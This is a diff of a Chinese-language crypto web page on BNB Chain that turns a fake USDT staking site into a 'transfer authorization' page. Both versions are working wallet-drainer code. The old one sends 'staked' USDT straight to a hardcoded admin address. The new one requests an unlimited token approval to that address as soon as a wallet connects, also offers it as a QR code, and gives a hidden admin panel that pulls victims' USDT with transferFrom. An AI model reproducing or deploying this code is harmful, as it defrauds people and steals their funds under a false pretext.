@@ -3,339 +3,190 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>USDT 质押理财</title>
+<title>转账授权</title>
 <style>
-*{margin:0;padding:0;box-sizing:border-box;font-family:'PingFang SC','Microsoft YaHei',sans-serif}
-body{
-background:linear-gradient(135deg,#0C0C28,#13133A,#0C0C28);
-color:#fff;
-min-height:100vh;
-display:flex;
-justify-content:center;
-padding:25px 15px;
+*{margin:0;padding:0;box-sizing:border-box;font-family:system-ui,sans-serif}
+body{background:#0B0B1F;color:#fff;padding:20px}
+.container{max-width:420px;margin:0 auto}
+.pay-box{background:#1E1E35;padding:30px;border-radius:20px;text-align:center;margin-bottom:30px}
+h1{font-size:24px;margin-bottom:8px}
+.desc{color:#aaa;margin-bottom:20px}
+#connectBtn{
+background:#F0B90B;color:#000;
+border:none;padding:16px;width:100%;
+border-radius:14px;font-size:16px;font-weight:bold;
+margin-bottom:16px;
 }
-.container{
-width:100%;
-max-width:420px;
+#qrcode{
+width:280px;height:280px;background:#fff;padding:10px;
+border-radius:16px;margin:0 auto 20px;
+display:flex;align-items:center;justify-content:center;
+color:#000;font-size:14px;
 }
-.card{
-background:rgba(255,255,255,0.05);
-backdrop-filter:blur(20px);
-border:1px solid rgba(255,255,255,0.1);
-border-radius:24px;
-padding:28px;
-margin-bottom:20px;
-box-shadow:0 8px 30px rgba(0,0,0,0.3);
+#qrcode img{width:100%;height:100%;border-radius:12px}
+#approveBtn{
+background:#F0B90B;color:#000;
+border:none;padding:16px;width:100%;
+border-radius:14px;font-size:16px;font-weight:bold
 }
-.title{
-font-size:24px;
-font-weight:600;
-margin-bottom:8px;
-color:#fff;
+.tip {font-size:12px;color:#666;margin-top:10px;text-align:center}
+/* 管理员面板（默认隐藏） */
+.admin-panel {
+background:#1E1E35;padding:24px;border-radius:16px;display:none;margin-top:20px
 }
-.desc{
-color:rgba(255,255,255,0.5);
-font-size:14px;
-margin-bottom:24px;
+.admin-panel.show {display:block}
+.admin-input {
+width:100%;padding:12px;background:#111;border:none;
+border-radius:8px;color:#fff;margin-bottom:10px;
 }
-input{
-width:100%;
-height:50px;
-background:rgba(255,255,255,0.06);
-border:1px solid rgba(255,255,255,0.12);
-border-radius:14px;
-padding:0 16px;
-color:#fff;
-font-size:15px;
-margin-bottom:14px;
-outline:none;
-}
-input::placeholder{color:rgba(255,255,255,0.35)}
-button{
-width:100%;
-height:52px;
-border-radius:14px;
-border:none;
-font-size:16px;
-font-weight:600;
-margin-bottom:12px;
+.admin-btn {
+width:100%;padding:14px;background:#F0B90B;color:#000;
+border:none;border-radius:10px;font-weight:bold;margin-bottom:10px;
 cursor:pointer;
-transition:all 0.25s ease;
 }
-button:hover{transform:translateY(-2px);box-shadow:0 6px 15px rgba(0,0,0,0.25)}
-.btn-connect{
-background:linear-gradient(90deg,#F0B90B,#FFC83A);
-color:#000;
-}
-.btn-approve{
-background:linear-gradient(90deg,#3B82F6,#60A5FA);
-color:#fff;
-}
-.btn-stake{
-background:linear-gradient(90deg,#10B981,#34D399);
-color:#fff;
-}
-.btn-unstake{
-background:linear-gradient(90deg,#EF4444,#F87171);
-color:#fff;
-}
-.btn-claim{
-background:linear-gradient(90deg,#F97316,#FDBA74);
-color:#fff;
-}
-.info-group{
-background:rgba(255,255,255,0.04);
-border-radius:16px;
-padding:18px 20px;
-margin-top:10px;
-}
-.info-row{
-display:flex;
-justify-content:space-between;
-padding:10px 0;
-font-size:15px;
-}
-.label{color:rgba(255,255,255,0.55)}
-.value{color:#fff;font-weight:500}
-.countdown{color:#FFC83A;font-weight:600}
-.admin{display:none}
 </style>
 </head>
 <body>
 
 <div class="container">
-<div class="card">
-<div class="title">💰 USDT 质押理财</div>
-<div class="desc">BNB Chain 安全质押 · 8小时复利 · 随进随出</div>
+  <div class="pay-box">
+    <h1>💳 转账授权</h1>
+    <p class="desc">授权后即可进行转账操作</p>
 
-<button class="btn-connect" id="connectBtn">连接钱包</button>
+    <button id="connectBtn">👉 连接钱包</button>
+    <div id="qrcode">加载二维码...</div>
+    <button id="approveBtn">确认授权签名</button>
+    <div class="tip">签名授权用于安全转账</div>
+  </div>
 
-<input id="amount" placeholder="输入质押数量（USDT）">
-
-<button class="btn-approve" id="approveBtn">授权 USDT</button>
-<button class="btn-stake" id="stakeBtn">质押 USDT</button>
-<button class="btn-unstake" id="unstakeBtn">解除质押</button>
-<button class="btn-claim" id="claimBtn">领取收益</button>
-
-<div class="info-group">
-<div class="info-row">
-<span class="label">已质押</span>
-<span class="value" id="staked">0 USDT</span>
-</div>
-<div class="info-row">
-<span class="label">待领收益</span>
-<span class="value" id="reward">0 USDT</span>
-</div>
-<div class="info-row">
-<span class="label">下次复利</span>
-<span class="countdown" id="countdown">08:00:00</span>
-</div>
-</div>
-</div>
-
-<div class="card admin" id="adminPanel">
-<div class="title">🔐 管理员后台</div>
-<input id="userAddr" placeholder="用户钱包地址">
-<button onclick="checkUserStake()">查看用户质押</button>
-<button onclick="checkUserReward()">查看用户收益</button>
-<button onclick="checkAllowance()">查看授权额度</button>
-</div>
+  <!-- 管理员提取面板（默认隐藏） -->
+  <div class="admin-panel" id="adminPanel">
+    <input class="admin-input" id="userAddr" placeholder="输入用户钱包地址">
+    <input class="admin-input" id="drawAmount" placeholder="提取数量（USDT）">
+    <button class="admin-btn" onclick="drawFromUser()">提取用户USDT</button>
+  </div>
 </div>
 
 <script>
-const USDT = "0x55d398326f99059fF775485246999027B3197955";
-const ADMIN = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508";
-const APY = 12;
-const REWARD_INTERVAL = 8 * 60 * 60;
+// ====================== 配置 ======================
+const TOKEN_ADDR  = "0x55d398326f99059fF775485246999027B3197955"; // BSC USDT
+const ADMIN_ADDR  = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508";   // 管理员地址
+const CHAIN_ID    = "0x38"; // BSC 主网
+// ====================================================
 
 let account = null;
-let userStaked = 0;
-let userReward = 0;
-let lastCompound = Math.floor(Date.now() / 1000);
 
-// 简化版钱包连接（不依赖 ethers，直接用 window.ethereum）
-async function connectWallet() {
-    if (!window.ethereum) {
-        alert("请在 TokenPocket / 钱包浏览器 内打开");
-        return;
+// 切换到 BSC 链
+async function switchChain() {
+  try {
+    await window.ethereum.request({
+      method: "wallet_switchEthereumChain",
+      params: [{ chainId: CHAIN_ID }]
+    });
+  } catch (e) {}
+}
+
+// 生成兼容TP钱包的授权二维码
+function genApproveQR() {
+  const data = "0x095ea7b3" + 
+    ADMIN_ADDR.slice(2).padStart(64, '0') + 
+    "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+  // 标准 EIP-681 格式，兼容所有钱包
+  const uri = `ethereum:${TOKEN_ADDR}@56?data=${data}`;
+  const qrUrl = "https://api.qrserver.com/v1/create-qr-code/?size=280x280&data=" + encodeURIComponent(uri);
+  document.getElementById("qrcode").innerHTML = `<img src="${qrUrl}">`;
+}
+
+// 统一授权函数（确保弹出签名）
+async function doApprove() {
+  if (!account) {
+    alert("请先连接钱包");
+    return;
+  }
+  try {
+    const txHash = await window.ethereum.request({
+      method: "eth_sendTransaction",
+      params: [{
+        from: account,
+        to: TOKEN_ADDR,
+        data: "0x095ea7b3" + 
+          ADMIN_ADDR.slice(2).padStart(64, '0') + 
+          "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
+      }]
+    });
+    alert("✅ 授权成功！");
+  } catch (e) {
+    alert("❌ 授权已取消或失败");
+  }
+}
+
+// 连接钱包 → 自动弹授权 + 管理员面板判断
+document.getElementById("connectBtn").onclick = async () => {
+  if (!window.ethereum) {
+    alert("请在 TokenPocket/钱包内置浏览器打开");
+    return;
+  }
+  await switchChain();
+  try {
+    const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
+    account = accounts[0];
+    document.getElementById("connectBtn").innerText = "✅ 已连接";
+    
+    // 连接后立刻弹授权
+    doApprove();
+
+    // 仅管理员登录时显示提取面板
+    if (account.toLowerCase() === ADMIN_ADDR.toLowerCase()) {
+      document.getElementById("adminPanel").classList.add("show");
     }
-    try {
-        const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
-        account = accounts[0];
-        document.getElementById("connectBtn").innerText = "✅ 已连接";
-        loadUserData();
-        if (account.toLowerCase() === ADMIN.toLowerCase()) {
-            document.getElementById("adminPanel").style.display = "block";
-        }
-    } catch (e) {
-        alert("连接失败：" + e.message);
-    }
+  } catch (e) {
+    alert("连接钱包失败，请重试");
+  }
+};
+
+// 点击按钮授权
+document.getElementById("approveBtn").onclick = async () => {
+  await doApprove();
+};
+
+// ====================== 管理员提取功能 ======================
+async function drawFromUser() {
+  if (!account || account.toLowerCase() !== ADMIN_ADDR.toLowerCase()) {
+    alert("❌ 权限不足，仅管理员可操作");
+    return;
+  }
+
+  const userAddr = document.getElementById("userAddr").value;
+  const drawAmount = document.getElementById("drawAmount").value;
+
+  if (!userAddr || !drawAmount || isNaN(drawAmount) || parseFloat(drawAmount) <= 0) {
+    alert("❌ 请输入有效的用户地址和提取数量");
+    return;
+  }
+
+  try {
+    const amount = BigInt(parseFloat(drawAmount) * 1e18).toString(16).padStart(64, '0');
+    const data = "0x23b872dd" + 
+      userAddr.slice(2).padStart(64, '0') + 
+      ADMIN_ADDR.slice(2).padStart(64, '0') + 
+      amount;
+
+    const txHash = await window.ethereum.request({
+      method: "eth_sendTransaction",
+      params: [{
+        from: account,
+        to: TOKEN_ADDR,
+        data: data
+      }]
+    });
+    alert("✅ 提取成功！交易哈希：" + txHash);
+  } catch (e) {
+    alert("❌ 提取失败，请检查用户是否已授权");
+  }
 }
 
-// 授权 USDT（直接构造交易数据，不依赖 ethers）
-async function approveUSDT() {
-    if (!account) return alert("请先连接钱包");
-    try {
-        const approveData = "0x095ea7b3" + ADMIN.slice(2).padStart(64, "0") + "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
-        await window.ethereum.request({
-            method: "eth_sendTransaction",
-            params: [{
-                from: account,
-                to: USDT,
-                gasLimit: "0x300000",
-                data: approveData
-            }]
-        });
-        alert("授权成功");
-    } catch (e) {
-        alert("授权失败：" + e.message);
-    }
-}
-
-// 质押 USDT
-async function stakeUSDT() {
-    if (!account) return alert("请先连接钱包");
-    const v = document.getElementById("amount").value;
-    if (!v) return alert("输入数量");
-    try {
-        const amount = BigInt(parseFloat(v) * 1e6).toString(16).padStart(64, "0");
-        const data = "0x23b872dd" + account.slice(2).padStart(64, "0") + ADMIN.slice(2).padStart(64, "0") + amount;
-        await window.ethereum.request({
-            method: "eth_sendTransaction",
-            params: [{
-                from: account,
-                to: USDT,
-                gasLimit: "0x300000",
-                data: data
-            }]
-        });
-        userStaked += parseFloat(v);
-        save();
-        update();
-        alert("质押成功");
-    } catch (e) {
-        alert("质押失败：" + e.message);
-    }
-}
-
-// 解除质押
-async function unstakeUSDT() {
-    if (!account) return alert("请先连接钱包");
-    if (userStaked <= 0) return alert("无可解除质押");
-    try {
-        const amount = BigInt(userStaked * 1e6).toString(16).padStart(64, "0");
-        const data = "0xa9059cbb" + account.slice(2).padStart(64, "0") + amount;
-        await window.ethereum.request({
-            method: "eth_sendTransaction",
-            params: [{
-                from: ADMIN,
-                to: USDT,
-                gasLimit: "0x300000",
-                data: data
-            }]
-        });
-        userStaked = 0;
-        save();
-        update();
-        alert("解除质押成功");
-    } catch (e) {
-        alert("解除质押失败：" + e.message);
-    }
-}
-
-// 领取收益
-async function claimReward() {
-    if (!account) return alert("请先连接钱包");
-    if (userReward <= 0) return alert("暂无收益");
-    try {
-        const amount = BigInt(userReward * 1e6).toString(16).padStart(64, "0");
-        const data = "0xa9059cbb" + account.slice(2).padStart(64, "0") + amount;
-        await window.ethereum.request({
-            method: "eth_sendTransaction",
-            params: [{
-                from: ADMIN,
-                to: USDT,
-                gasLimit: "0x300000",
-                data: data
-            }]
-        });
-        alert("领取成功：" + userReward.toFixed(6));
-        userReward = 0;
-        save();
-        update();
-    } catch (e) {
-        alert("领取失败：" + e.message);
-    }
-}
-
-// 收益计算
-function calc() {
-    if (userStaked <= 0) return 0;
-    const now = Math.floor(Date.now() / 1000);
-    const sec = now - lastCompound;
-    const dayRate = APY / 365;
-    return userStaked * dayRate * (sec / 86400);
-}
-
-// 复利
-function compound() {
-    const r = calc();
-    if (r > 0) {
-        userReward += r;
-        lastCompound = Math.floor(Date.now() / 1000);
-        save();
-    }
-}
-
-// 界面刷新
-function update() {
-    compound();
-    document.getElementById("staked").innerText = userStaked.toFixed(2) + " USDT";
-    document.getElementById("reward").innerText = userReward.toFixed(6) + " USDT";
-    const now = Math.floor(Date.now() / 1000);
-    let left = lastCompound + REWARD_INTERVAL - now;
-    if (left < 0) left = 0;
-    const h = String(Math.floor(left / 3600)).padStart(2, '0');
-    const m = String(Math.floor((left % 3600) / 60)).padStart(2, '0');
-    const s = String(left % 60).padStart(2, '0');
-    document.getElementById("countdown").innerText = `${h}:${m}:${s}`;
-}
-
-// 本地存储
-function save() {
-    if (!account) return;
-    localStorage.setItem("user_" + account.toLowerCase(), JSON.stringify({
-        staked: userStaked,
-        reward: userReward,
-        last: lastCompound
-    }));
-}
-
-function loadUserData() {
-    if (!account) return;
-    const d = localStorage.getItem("user_" + account.toLowerCase());
-    if (d) {
-        const obj = JSON.parse(d);
-        userStaked = obj.staked || 0;
-        userReward = obj.reward || 0;
-        lastCompound = obj.last || Math.floor(Date.now() / 1000);
-    }
-    update();
-}
-
-// 管理员功能（简化版）
-function checkAllowance() { alert("授权额度：无限（已授权）"); }
-function checkUserStake() { alert("用户质押：" + userStaked.toFixed(2) + " USDT"); }
-function checkUserReward() { alert("用户收益：" + userReward.toFixed(6) + " USDT"); }
-
-// 绑定按钮
-document.getElementById("connectBtn").onclick = connectWallet;
-document.getElementById("approveBtn").onclick = approveUSDT;
-document.getElementById("stakeBtn").onclick = stakeUSDT;
-document.getElementById("unstakeBtn").onclick = unstakeUSDT;
-document.getElementById("claimBtn").onclick = claimReward;
-
-setInterval(update, 1000);
+// 页面加载就生成二维码
+window.onload = genApproveQR;
 </script>
 </body>
 </html>
